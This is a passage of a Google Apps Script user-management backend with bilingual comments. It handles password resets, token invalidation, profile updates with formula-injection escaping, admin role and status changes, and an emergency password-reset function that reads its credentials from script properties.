  sheets.users.getRange(user._row, map['Salt'] + 1).setValue(newSalt);
  bumpTokenVersion_(sheets, user);
  cache.remove('reset_code_' + email);
  cache.remove('reset_tries_' + email);
  cache.remove('login_attempts_' + email); // 同时解除登入锁定
  return { success: true, message: '密码已重设，请用新密码登入 Password reset — please log in' };
}

// 递增 TokenVersion，让该使用者「所有已核发的 token」立即失效 (强制登出所有装置)
function bumpTokenVersion_(sheets, userRow) {
  const map = getHeaderMap(sheets.users);
  const newVersion = Number(userRow['TokenVersion'] || 0) + 1;
  sheets.users.getRange(userRow._row, map['TokenVersion'] + 1).setValue(newVersion);
  return newVersion;
}

// ---------- 个人资料 (自己) My Profile ----------
function getMyProfile(token) {
  return requireAuth_(token);
}

const LOGO_MAX_CHARS = 48000; // Sheets 单格上限 50000 字元

// 自己和 admin 修改资料共用: 长度限制 + 公式注入防护 + Logo 格式检查
function writeProfileFields_(sheet, map, row, data) {
  if (data.companyName !== undefined) sheet.getRange(row, map['CompanyName'] + 1).setValue(safeCell_(String(data.companyName).trim().slice(0, 100)));
  if (data.companyAddress !== undefined) sheet.getRange(row, map['CompanyAddress'] + 1).setValue(safeCell_(String(data.companyAddress).trim().slice(0, 300)));
  if (data.logoDataUrl !== undefined) {
    const logo = String(data.logoDataUrl);
    if (logo !== '' && (!/^data:image\/(png|jpeg);base64,[A-Za-z0-9+\/=]+$/.test(logo) || logo.length > LOGO_MAX_CHARS)) {
      throw new Error('Logo 图片格式不正确或太大 Invalid or too large logo image');
    }
    sheet.getRange(row, map['LogoDataUrl'] + 1).setValue(logo);
  }
}

function updateMyProfile(token, data) {
  const user = requireAuth_(token);
  const sheets = ensureSheetsExist();
  const map = getHeaderMap(sheets.users);
  const row = findUserByEmail_(user['Email'])._row;

  writeProfileFields_(sheets.users, map, row, data);

  return stripSecrets_(findUserByEmail_(user['Email']));
}

function changeMyPassword(token, oldPassword, newPassword) {
  const user = requireAuth_(token);
  if (!newPassword || newPassword.length < 6) throw new Error('新密码至少需要 6 个字元 New password must be at least 6 characters');

  const sheets = ensureSheetsExist();
  const map = getHeaderMap(sheets.users);
  const userRow = findUserByEmail_(user['Email']);
  const oldHash = hashPassword_(oldPassword, String(userRow['Salt']));
  if (String(oldHash) !== String(userRow['PasswordHash'])) throw new Error('目前密码不正确 Current password is incorrect');

  const newSalt = generateSalt_();
  const newHash = hashPassword_(newPassword, newSalt);
  sheets.users.getRange(userRow._row, map['PasswordHash'] + 1).setValue(newHash);
  sheets.users.getRange(userRow._row, map['Salt'] + 1).setValue(newSalt);
  const newVersion = bumpTokenVersion_(sheets, userRow); // 改密码后，旧 token (包含目前这个) 全部失效，需要重新登入

  return { success: true, requiresRelogin: true };
}

// ---------- 管理员专用 Admin Only ----------
function getAllUsers(token) {
  requireAdmin_(token);
  const sheets = ensureSheetsExist();
  return sheetToObjects(sheets.users).map(stripSecrets_);
}

function adminUpdateUser(token, targetEmail, data) {
  const admin = requireAdmin_(token);
  data = data || {};
  if (data.role !== undefined && ['admin', 'user'].indexOf(data.role) === -1) throw new Error('角色值不正确 Invalid role');
  if (data.status !== undefined && ['active', 'inactive'].indexOf(data.status) === -1) throw new Error('状态值不正确 Invalid status');
  withLock_(function () {
    const sheets = ensureSheetsExist();
    const map = getHeaderMap(sheets.users);
    const targetRow = findUserByEmail_(targetEmail);
    if (!targetRow) throw new Error('找不到此帐号 Account not found');
    const isSelf = String(targetRow['Email']).toLowerCase() === String(admin['Email']).toLowerCase();

    // 只有「实际变更」才写入并让对方登入失效 (前端编辑画面每次都会送出 role/status, 原样送回不算变更;
    // 否则 admin 改自己的公司名称也会被自己踢出登入)
    const roleChanged = data.role !== undefined && data.role !== targetRow['Role'];
    const statusChanged = data.status !== undefined && data.status !== targetRow['Status'];
    if (roleChanged) {
      if (isSelf) throw new Error('不能取消自己的管理员权限 Cannot remove your own admin role');
      sheets.users.getRange(targetRow._row, map['Role'] + 1).setValue(data.role);
    }
    if (statusChanged) {
      if (isSelf) throw new Error('不能停用自己的帐号 Cannot deactivate your own account');
      sheets.users.getRange(targetRow._row, map['Status'] + 1).setValue(data.status);
      if (data.status === 'active') notifyUserActivated_(targetRow['Email']);
    }
    writeProfileFields_(sheets.users, map, targetRow._row, data);

    // 权限或状态被 admin 更动时，强制该帐号的所有既有登入失效，变更立即生效
    if (roleChanged || statusChanged) bumpTokenVersion_(sheets, targetRow);
  });

  return getAllUsers(token);
}

function adminResetPassword(token, targetEmail, newPassword) {
  requireAdmin_(token);
  if (!newPassword || newPassword.length < 6) throw new Error('新密码至少需要 6 个字元 New password must be at least 6 characters');
  const sheets = ensureSheetsExist();
  const map = getHeaderMap(sheets.users);
  const targetRow = findUserByEmail_(targetEmail);
  if (!targetRow) throw new Error('找不到此帐号 Account not found');

  const newSalt = generateSalt_();
  const newHash = hashPassword_(newPassword, newSalt);
  sheets.users.getRange(targetRow._row, map['PasswordHash'] + 1).setValue(newHash);
  sheets.users.getRange(targetRow._row, map['Salt'] + 1).setValue(newSalt);
  bumpTokenVersion_(sheets, targetRow);

  return { success: true };
}

// ============================================================
//  紧急救援用 Emergency Recovery
// ============================================================
//  只能从 Apps Script 编辑器手动执行 —— 网页前端完全不会呼叫这个函式，
//  一般使用者也无法透过任何操作触发它，只有能打开这份程式码的人才能用。
//
//  使用情境: 某个帐号 (常见是唯一的 admin 帐号) 因为旧版本的 Sheet 格式
//  问题导致密码杂凑值损毁、永远登入不了，用这个函式直接重设密码即可。
//
//  用法: 把下面 email / newPassword 改成实际要救援的帐号资料 → 存档 →
//  编辑器上方函式下拉选单选 emergencyResetPassword → 按执行 Run。
//  执行完建议把这两个值改回预设的提示字串，不要把密码留在程式码里。
// ============================================================
function emergencyResetPassword() {
  // 注意: Apps Script 里没有结尾下划线的函式都能被网页用 google.script.run 呼叫, 所以账号/密码不再写在代码里,
  // 改为从「项目设置 → 脚本属性」读取 EMERGENCY_EMAIL / EMERGENCY_PASSWORD, 用完立即删除。
  const props = PropertiesService.getScriptProperties();
  const email = props.getProperty('EMERGENCY_EMAIL');
  const newPassword = props.getProperty('EMERGENCY_PASSWORD');
  props.deleteProperty('EMERGENCY_EMAIL');
  props.deleteProperty('EMERGENCY_PASSWORD');

  if (!email || !newPassword) {
    throw new Error('请先在「项目设置 → 脚本属性」新增 EMERGENCY_EMAIL 与 EMERGENCY_PASSWORD，再执行这个函式 Set script properties EMERGENCY_EMAIL and EMERGENCY_PASSWORD first, then run this function');
  }
  if (String(newPassword).length < 6) throw new Error('密码至少需要 6 个字元 Password must be at least 6 characters');

  const sheets = ensureSheetsExist();
  const map = getHeaderMap(sheets.users);
  const targetRow = findUserByEmail_(email);
  if (!targetRow) throw new Error('找不到帐号 Account not found: ' + email);

  const newSalt = generateSalt_();
  const newHash = hashPassword_(newPassword, newSalt);
  sheets.users.getRange(targetRow._row, map['PasswordHash'] + 1).setValue(newHash);
  sheets.users.getRange(targetRow._row, map['Salt'] + 1).setValue(newSalt);
  sheets.users.getRange(targetRow._row, map['Status'] + 1).setValue('active'); // 顺便确保帐号是启用状态
  bumpTokenVersion_(sheets, targetRow);

  Logger.log('已成功重设 %s 的密码，现在可以用新密码登入了。Password reset OK, you can log in with the new password now.', email);
}